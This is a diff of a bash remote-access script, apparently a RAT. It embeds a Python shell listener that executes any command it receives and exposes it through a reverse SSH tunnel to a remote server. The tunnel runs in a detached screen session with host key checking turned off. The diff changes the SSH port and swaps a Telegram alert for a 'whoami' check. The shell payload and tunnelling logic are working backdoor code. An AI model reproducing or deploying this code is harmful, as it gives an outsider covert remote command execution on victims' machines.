@@ -6,12 +6,12 @@ SSH_KEY="your_sha512_ssh_key_filename" #Update according to your server's config
 SSH_USER="lp1" #The user which will be used to connect to the server
 LPORT="5001"
 RPORT="5002"
-REMOTE_SSH_PORT="22" #Your server's SSH port
+SSH_PORT="9101" #Your server's SSH port
 TIMEOUT=3
 
 ### Custom Execution
 
-POST_SSH_COMMAND="/home/lp1/TelegramAssistant/env/bin/python3 /home/lp1/TelegramAssistant/messenger.py 'A new client has connected and is available on the port $RPORT on the server'"
+POST_SSH_COMMAND="whoami"
 
 SHELL='exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("127.0.0.1",LPORT));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
 SHELL=${SHELL/"LPORT"/$LPORT}
@@ -53,11 +53,14 @@ for I in $(seq 1 $TIMEOUT);do
             -o "StrictHostKeyChecking no" \
             -o "UserKnownHostsFile /dev/null" \
 	    -i "$HOME/.ratata/id_rsa" \
-	    $PORT_SSH_COMMAND
+	    -p $SSH_PORT \
+	    $SSH_USER@$SERVER \
+	    $POST_SSH_COMMAND && \
 	screen -dmS ssh_tunnel ssh -o "ConnectTimeout 3" \
             -o "StrictHostKeyChecking no" \
             -o "UserKnownHostsFile /dev/null" \
 	    -i "$HOME/.ratata/id_rsa" \
+	    -p $SSH_PORT \
 	    -R 127.0.0.1:$RPORT:127.0.0.1:$LPORT \
 	    $SSH_USER@$SERVER
     fi
